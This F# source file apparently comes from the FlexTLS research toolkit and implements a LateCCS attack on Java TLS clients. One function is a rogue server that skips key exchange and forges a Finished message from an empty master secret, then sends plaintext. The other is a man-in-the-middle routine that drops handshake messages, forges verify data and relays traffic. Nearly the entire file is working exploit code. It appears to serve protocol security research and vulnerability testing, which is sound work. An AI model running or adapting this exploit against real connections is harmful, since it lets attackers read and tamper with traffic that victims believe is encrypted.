#light "off"

module FlexApps.Attack_JavaLateCCS

open Bytes
open Error
open TLSInfo
open TLSConstants

open FlexTLS
open FlexTypes
open FlexConstants
open FlexConnection
open FlexHandshake
open FlexClientHello
open FlexServerHello
open FlexCertificate
open FlexCertificateRequest
open FlexCertificateVerify
open FlexServerHelloDone
open FlexClientKeyExchange
open FlexServerKeyExchange
open FlexCCS
open FlexFinished
open FlexState
open FlexSecrets
open FlexAppData



type LateCCS =
    class

    static member server (listening_address:string, ?port:int) : unit =
        let g1 = new UntrustedCert.X509Certificate2("g1.cer") in
        let g2 = new UntrustedCert.X509Certificate2("g2.cer") in
        let g3 = new UntrustedCert.X509Certificate2("g3.cer") in
        let chain = UntrustedCert.x509list_to_chain [g1; g2; g3] in
        let port = defaultArg port FlexConstants.defaultTCPPort in

        while true do
            // Accept TCP connection from the client
            let st,cfg = FlexConnection.serverOpenTcpConnection(listening_address, "", port) in

            // Start typical RSA key exchange
            let st,nsc,fch   = FlexClientHello.receive(st) in

            // Sanity check: our preferred ciphersuite is there
            if not (List.exists (fun cs -> cs = TLS_RSA_WITH_AES_128_CBC_SHA) (FlexClientHello.getCiphersuites fch)) then
                failwith (perror __SOURCE_FILE__ __LINE__ "No suitable ciphersuite given")
            else

            let fsh = { FlexConstants.nullFServerHello with 
                ciphersuite = Some(TLSConstants.TLS_DHE_RSA_WITH_AES_128_CBC_SHA)} in
            let st,nsc,fsh   = FlexServerHello.send(st,fch,nsc,fsh) in
            let log         = fch.payload @| fsh.payload in
            let st, nsc, fc = FlexCertificate.send(st, Server, chain, nsc) in
            let log = log @| fc.payload in
            let verify_data = FlexSecrets.makeVerifyData nsc.si (abytes [||]) Server log in
        
            let st,fin = FlexFinished.send(st,verify_data=verify_data) in
//            let st, req = FlexAppData.receive(st) in
            let st = FlexAppData.send(st,"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 43\r\n\r\nYou are vulnerable to the LateCCS attack!\r\n") in
            Tcp.close st.ns;
            ()
        done

        static member runMITM (server_name:string, ?port:int) : state * state =
             let port = defaultArg port FlexConstants.defaultTCPPort in

            // Start being a Man-In-The-Middle
            let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections("0.0.0.0",server_name,listener_port=6666,server_cn=server_name,server_port=port) in

            // Receive and Forward the Client Hello
            let sst,nsc,sch   = FlexClientHello.receive(sst) in
            let cst = FlexHandshake.send(cst,sch.payload) in

            // Receive and Forward the Server Hello
            let cst,nsc,csh = FlexServerHello.receive(cst,sch,nsc) in
            let sst = FlexHandshake.send(sst,csh.payload) in

            // Receive and Forward the Server Certificate
            let cst,nsc,ccert = FlexCertificate.receive(cst,Client,nsc) in
            let sst = FlexHandshake.send(sst,ccert.payload) in

            // Drop the Server Key Exchange
            let cst,cnsc,cske  = FlexServerKeyExchange.receiveDHE(cst,nsc) in

            // Drop the Server Hello Done
            let cst,cshd      = FlexServerHelloDone.send(cst) in

            // Send the Client Key Exchange to the server
            let cst,cnsc,ccke  = FlexClientKeyExchange.sendDHE(cst,cnsc) in

            // Send the CCS to the server
            let cst,_ = FlexCCS.send(cst) in
            
            // Start encrypting on attacker to server side
            let cst  = FlexState.installWriteKeys cst nsc in
            let clog = sch.payload @| csh.payload @| ccert.payload @| cske.payload @| cshd.payload @| ccke.payload in
            let cst,cffC = FlexFinished.send(cst,cnsc,Client) in

            // Drop the CCS
            let cst,_,_  = FlexCCS.receive(cst) in

            // Start decrypting on atacker to server side
            let cst = FlexState.installReadKeys cst nsc in

            let verify_data  = FlexSecrets.makeVerifyData nsc.si nsc.keys.ms Server (clog @| cffC.payload) in
            let cst,cffS     = FlexFinished.receive(cst,cnsc,Server) in
                       
            // Compute the verifiy data on attacker to client side
            let slog = sch.payload @| csh.payload @| ccert.payload in
            let sverify_data = FlexSecrets.makeVerifyData nsc.si (abytes [||]) Server slog in
            let sst,sffS = FlexFinished.send(sst,sverify_data) in

            // The client and the attacker exchange plaintext after end of the handshake

            // Forward the rest of the handshake and the application data
            FlexConnection.passthrough(cst.ns,sst.ns);
            sst,cst
    end
